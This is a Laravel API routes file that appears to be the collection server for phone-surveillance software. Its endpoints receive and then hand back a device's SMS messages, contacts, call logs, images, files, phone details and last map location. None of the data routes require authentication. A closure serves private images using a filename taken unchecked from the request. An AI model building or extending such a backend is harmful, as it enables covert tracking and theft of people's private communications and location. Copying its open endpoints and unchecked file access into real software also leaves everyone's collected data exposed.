<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\gt;
Route::get('/user', function (Request $request) {
    return $request->user();
})->middleware('auth:sanctum');

Route::post('sms',[gt::class,'savesms']);
Route::post('savecontact',[gt::class,'savecontact']);
Route::post('savecallog',[gt::class,'savecallog']);
Route::post('saveImage',[gt::class,'saveImage']);
Route::post('savephone',[gt::class,'savephone']);
Route::post('uploadFile',[gt::class,'savefiles']);
Route::post('savepointlocation',[gt::class,'savepointlocation']);

Route::get('getsms', [gt::class, 'getSms']);
Route::get('contacts', [gt::class, 'getContacts']);
Route::get('calllog', [gt::class, 'getCallog']);
Route::get('images', [gt::class, 'getImages']);
Route::get('files', [gt::class, 'getFiles']);  
Route::get('phones', [gt::class, 'getphones']);  
Route::get('getlastplaseforuseronmap', [gt::class, 'getlastplaseforuseronmap']);  

Route::get('private-image/{filename}', function ($filename, Request $request) {
    $path = storage_path('app/private/public/images/' . $filename);

    if (!file_exists($path)) {
        return response()->json(['error' => 'Image not found'], 404);
    }

    // أو يمكن إرسال header مناسب
    $mime = mime_content_type($path);
    return response()->file($path, [
        'Content-Type' => $mime,
    ]);
});